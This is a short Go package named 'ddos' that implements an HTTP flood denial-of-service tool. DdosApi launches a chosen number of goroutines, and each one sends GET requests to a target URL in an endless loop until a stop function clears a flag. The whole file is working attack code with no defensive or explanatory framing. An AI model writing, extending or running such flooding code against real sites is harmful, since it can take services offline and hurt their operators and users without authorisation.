package ddos

import (
	"net/http"
)

//Attack stats variables
var (
	threadCounter int
	cont          bool
)

func DdosApi(threads int, url string) {
	StartDdos()
	for threadCounter < threads {
		go FloodWorker(url)
		threadCounter += 1
	}
}

func FloodWorker(url string) {
	for cont {
		http.Get(url)
	}
}

func StopDdos() {
	cont = false
}

func StartDdos() {
	cont = true
}
